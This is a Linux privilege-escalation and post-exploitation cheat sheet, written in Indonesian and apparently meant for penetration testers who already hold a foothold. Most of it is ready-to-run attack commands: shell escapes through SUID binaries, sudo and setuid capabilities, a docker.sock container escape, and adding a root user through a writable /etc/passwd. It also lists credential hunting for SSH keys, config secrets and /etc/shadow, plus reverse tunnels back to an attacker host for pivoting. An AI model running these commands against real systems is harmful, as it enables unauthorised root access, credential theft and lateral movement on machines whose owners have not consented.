# LINUX — PrivEsc & Post-Exploitation

> Untuk foothold Linux. Alur: **enum otomatis + manual → vektor privesc → root → loot → pivot**.
> Prioritas cek: SUID, sudo, capabilities, cron, kernel, creds. GTFOBins = kamus escape.

## Daftar Isi
1. [Enum awal](#enum)
2. [PrivEsc otomatis](#auto)
3. [SUID / SGID → GTFOBins](#suid)
4. [Sudo misconfig](#sudo)
5. [Capabilities](#cap)
6. [Cron / timers / writable](#cron)
7. [Kernel & service exploit](#kernel)
8. [Credential hunting](#creds)
9. [Container escape](#container)
10. [Pivoting & tunneling](#pivot)

---

<a name="enum"></a>
## 1. Enum Awal

```bash
id; whoami; sudo -l 2>/dev/null
uname -a; cat /etc/os-release          # kernel & distro → cek exploit
hostname; ip a; ip route; cat /etc/hosts
cat /etc/passwd | grep -v nologin      # user login-able
ps auxww                                # proses (root proc? creds di cmdline?)
netstat -tulpn 2>/dev/null || ss -tulpn # service lokal (localhost-only → pivot target)
env; cat ~/.bash_history ~/.*_history 2>/dev/null
ls -la /home/*; find / -writable -type d 2>/dev/null | head
```

---

<a name="auto"></a>
## 2. PrivEsc Otomatis

```bash
./linpeas.sh -a | tee evidence/linpeas.txt     # paling lengkap (highlight PE vector)
./lse.sh -l1                                    # linux-smart-enum (alternatif ringan)
# pspy — pantau proses/cron tanpa root (nangkep cron root jalanin script writable)
./pspy64
```

---

<a name="suid"></a>
## 3. SUID / SGID → GTFOBins

```bash
find / -perm -4000 -type f 2>/dev/null          # SUID
find / -perm -2000 -type f 2>/dev/null          # SGID
# Setiap binary tak-standar → cek gtfobins.github.io untuk teknik escape.
# Contoh klasik:
#   find . -exec /bin/sh -p \; -quit
#   nmap --interactive → !sh   (versi lama)
#   /usr/bin/env /bin/sh -p ; awk 'BEGIN{system("/bin/sh -p")}' ; vim.basic -c ':!/bin/sh -p'
#   cp/tar/less/more/nano dgn SUID → baca /etc/shadow atau overwrite
```

---

<a name="sudo"></a>
## 4. Sudo Misconfig

```bash
sudo -l    # apa yang bisa dijalankan sbg root?
# NOPASSWD binary → GTFOBins "Sudo" section untuk escape ke shell root.
#   Contoh: sudo vim -c ':!/bin/sh' ; sudo less /etc/hosts → !sh ; sudo awk 'BEGIN{system("sh")}'
# LD_PRELOAD / LD_LIBRARY_PATH kalau env_keep aktif → shared object jahat.
# Wildcard di script sudo (tar --checkpoint-action, rsync -e) → injection.
# CVE sudo (Baron Samedit CVE-2021-3156) jika versi rentan.
sudo --version   # cek versi
```

---

<a name="cap"></a>
## 5. Capabilities

```bash
getcap -r / 2>/dev/null
# cap_setuid+ep pada python/perl → setuid(0) → root
#   ./python -c 'import os; os.setuid(0); os.system("/bin/sh")'
# cap_dac_read_search → baca file apa saja (shadow). cap_sys_admin → mount/escape.
```

---

<a name="cron"></a>
## 6. Cron / Timers / Writable

```bash
cat /etc/crontab; ls -la /etc/cron.*; systemctl list-timers
# Script cron root yang writable / PATH relatif / wildcard → inject perintah.
find / -writable -not -path "/proc/*" 2>/dev/null | grep -Ev "^/(sys|dev)"
# Writable /etc/passwd → tambah user root (openssl passwd). Writable service unit → root.
# PATH hijack: cron panggil binary tanpa full path + dir writable di depan PATH.
```

---

<a name="kernel"></a>
## 7. Kernel & Service Exploit

```bash
uname -r                     # → searchsploit / exploit-db (DirtyPipe CVE-2022-0847,
                             #    DirtyCow CVE-2016-5195, PwnKit/pkexec CVE-2021-4034, dll)
searchsploit linux kernel <ver>
# PwnKit (pkexec) hampir universal di sistem lama:
ls -la /usr/bin/pkexec       # SUID + versi rentan → PwnKit PoC
# Service lokal rentan (localhost:xxxx) → exploit lalu pivot.
```

---

<a name="creds"></a>
## 8. Credential Hunting

```bash
# History, config, key
cat ~/.bash_history ~/.mysql_history ~/.psql_history 2>/dev/null
find / -name "id_rsa" -o -name "id_ed25519" -o -name "*.pem" 2>/dev/null
find / -name "*.conf" -o -name "*.config" -o -name ".env" 2>/dev/null | xargs grep -l -i "pass\|secret\|token" 2>/dev/null
grep -rEi "password|passwd|secret|api[_-]?key|token" /var/www /opt /home 2>/dev/null | head
cat /var/www/html/wp-config.php /var/www/html/config.php 2>/dev/null   # DB creds
# LaZagne (Linux) untuk creds tersimpan. Baca /etc/shadow (kalau bisa) → crack.
# Reuse: password app → SSH/DB/sudo. Selalu coba reuse antar service.
```

---

<a name="container"></a>
## 9. Container Escape

```bash
cat /proc/1/cgroup; ls -la /.dockerenv          # di dalam container?
capsh --print                                    # capabilities (privileged?)
# docker.sock termount → escape:
ls -la /var/run/docker.sock && docker -H unix:///var/run/docker.sock run -v /:/host -it alpine chroot /host
# CAP_SYS_ADMIN + no seccomp → release_agent cgroup escape. Kernel exploit dari container.
```
Detail K8s → `references/cloud.md` §6.

---

<a name="pivot"></a>
## 10. Pivoting & Tunneling

```bash
# ligolo-ng (terbaik, bikin interface tun — akses subnet internal transparan)
./proxy -selfcert                                       # attacker
./agent -connect <attacker>:11601 -ignore-cert          # target
# di proxy: interface add + route add <subnet> via tun

# chisel SOCKS reverse
chisel server -p 8000 --reverse                         # attacker
chisel client <attacker>:8000 R:socks                   # target → proxychains ke internal

# SSH tunnel klasik
ssh -D 1080 user@target                                 # dynamic SOCKS
ssh -L 8080:internal:80 user@target                     # local forward
ssh -R 9000:localhost:80 user@attacker                  # reverse

# proxychains config: socks5 127.0.0.1 1080 → proxychains nmap/crackmapexec ke internal
```

**Port forward native (tanpa tool):** `socat`, `netsh interface portproxy` (Windows), SSH.
